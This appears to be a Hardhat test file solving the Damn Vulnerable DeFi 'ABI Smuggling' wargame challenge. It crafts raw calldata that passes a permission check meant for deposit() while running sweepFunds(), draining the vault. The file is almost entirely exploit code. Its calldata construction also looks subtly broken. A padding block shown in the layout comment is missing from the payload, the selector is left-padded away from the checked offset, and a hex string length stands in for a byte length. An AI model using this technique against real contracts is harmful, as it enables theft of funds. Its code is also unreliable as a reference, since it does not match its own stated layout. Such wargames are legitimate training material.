const { ethers } = require("hardhat");
const { expect } = require("chai");

/**
 * ABI Smuggling Exploit — Damn Vulnerable DeFi
 *
 * Vulnerability: AuthorizedExecutor.execute() reads the permission-checked
 * selector from a hardcoded calldata offset (0x44), but the actual .call()
 * resolves actionData via ABI offset pointer. By shifting the pointer to 0x80,
 * we place the permitted selector (deposit) at 0x44 while sweepFunds() sits
 * at 0x80 — where it actually executes.
 */
describe("ABI Smuggling Exploit", function () {
  let vault, token;
  let deployer, player, recovery;
  const VAULT_TOKEN_BALANCE = ethers.parseEther("1000000");

  before(async () => {
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy token
    const Token = await ethers.getContractFactory("DamnValuableToken");
    token = await Token.deploy();

    // Deploy vault
    const Vault = await ethers.getContractFactory("SelfAuthorizedVault");
    vault = await Vault.deploy();

    // Fund vault
    await token.transfer(await vault.getAddress(), VAULT_TOKEN_BALANCE);

    // Grant player permission for deposit() — the only permission they have
    const depositSelector = vault.interface.getFunction("deposit").selector;
    await vault.connect(deployer).setPermission(
      ethers.keccak256(
        ethers.solidityPacked(
          ["bytes4", "address", "address"],
          [depositSelector, player.address, await vault.getAddress()]
        )
      ),
      true
    );

    console.log("Vault funded:", ethers.formatEther(
      await token.balanceOf(await vault.getAddress())
    ), "DVT");
    console.log("Player has only deposit() permission");
  });

  it("bypasses permission check with smuggled selector and drains vault", async () => {
    const vaultAddress = await vault.getAddress();
    const tokenAddress = await token.getAddress();
    const recoveryAddress = recovery.address;

    // --- Build smuggled calldata ---
    const executeSelector   = vault.interface.getFunction("execute").selector;
    const depositSelector   = vault.interface.getFunction("deposit").selector;
    const sweepSelector     = vault.interface.getFunction("sweepFunds").selector;

    // Encode the actual sweepFunds payload
    const sweepData = vault.interface.encodeFunctionData("sweepFunds", [
      recoveryAddress,
      tokenAddress,
    ]);

    // Craft raw calldata with shifted offset pointer:
    //   0x00  execute() selector
    //   0x04  target (vault)
    //   0x24  offset pointer → 0x80 (shifted past the padding block)
    //   0x44  deposit() selector + 28 bytes padding  ← check reads here
    //   0x64  28 bytes padding
    //   0x80  length of sweepData                    ← actionData resolves here
    //   0xa0  sweepFunds(recovery, token) payload
    const payload = ethers.concat([
      executeSelector,
      ethers.AbiCoder.defaultAbiCoder().encode(["address"], [vaultAddress]),
      ethers.zeroPadValue(ethers.toBeHex(0x80), 32),           // shifted offset
      ethers.zeroPadValue(depositSelector, 32),                 // deposit() at 0x44
      ethers.zeroPadValue(ethers.toBeHex(sweepData.length), 32),// length at 0x80
      sweepData,                                                 // sweepFunds payload
    ]);

    // Send the crafted calldata directly
    const tx = await player.sendTransaction({
      to: vaultAddress,
      data: payload,
    });
    await tx.wait();

    // --- Assertions ---
    const vaultBalance    = await token.balanceOf(vaultAddress);
    const recoveryBalance = await token.balanceOf(recoveryAddress);

    console.log("\nAfter exploit:");
    console.log("  Vault balance:   ", ethers.formatEther(vaultBalance), "DVT");
    console.log("  Recovery balance:", ethers.formatEther(recoveryBalance), "DVT");

    expect(vaultBalance).to.equal(0n, "Vault should be empty");
    expect(recoveryBalance).to.equal(VAULT_TOKEN_BALANCE, "Recovery should hold all tokens");
  });
});
